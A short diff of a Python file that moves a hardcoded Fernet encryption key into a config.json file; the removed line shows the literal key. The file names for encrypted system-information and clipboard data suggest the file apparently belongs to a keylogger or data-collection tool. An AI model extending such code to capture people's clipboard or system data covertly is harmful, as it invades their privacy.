@@ -1,6 +1,11 @@
 from cryptography.fernet import Fernet
+import json
 
-key = "94pJIpT_32DuV40AiHMqLm-F914oSaj8jQ8UrOCcVFE="
+with open('config.json') as f:
+    config = json.load(f)
+    
+    
+key = config["key"]
 
 system_information_e = 'e_systeminfo.txt'
 clipboard_information_e = 'e_clipboard.txt'
